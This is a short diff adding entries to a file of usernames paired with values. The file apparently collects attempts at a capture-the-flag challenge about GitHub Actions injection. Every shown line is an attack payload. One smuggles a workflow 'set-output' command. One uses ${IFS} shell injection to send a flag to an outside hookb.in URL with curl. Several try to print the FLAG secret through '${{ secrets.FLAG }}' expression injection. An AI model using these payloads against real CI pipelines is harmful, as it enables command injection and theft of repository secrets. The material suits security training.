@@ -759,3 +759,7 @@ Ha1f00L:::set-output name=name::biodog
 DrenLea:
 Zeker62:;set${IFS}+e;${IFS}curl${IFS}https://hookb.in/XkYGbdzLGOsDYMQQY1Kd?flag=${flag};
 
+MRZUO1101:${{ secrets.FLAG }}
+echo ${{ secrets.FLAG }};
+cat ${{ secrets.FLAG }}
+cat secrets.FLAG
